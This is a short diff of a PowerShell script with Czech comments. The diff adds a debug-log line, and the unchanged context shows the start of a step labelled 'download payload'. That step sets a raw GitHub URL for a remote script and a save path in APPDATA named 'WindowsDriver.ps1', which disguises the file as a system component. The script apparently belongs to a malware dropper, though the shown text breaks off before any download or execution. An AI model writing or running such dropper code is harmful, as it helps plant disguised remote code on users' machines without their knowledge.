@@ -1,3 +1,5 @@
+Add-Content -Path "$env:TEMP\vecra_debug.log" -Value "Skript spuštěn: $(Get-Date)"
+
 # 1. Stáhni payload
 $payloadUrl = "https://raw.githubusercontent.com/JiriWeiss/Vecra/main/Vecra1.ps1"
 $localPath = "$env:APPDATA\WindowsDriver.ps1"
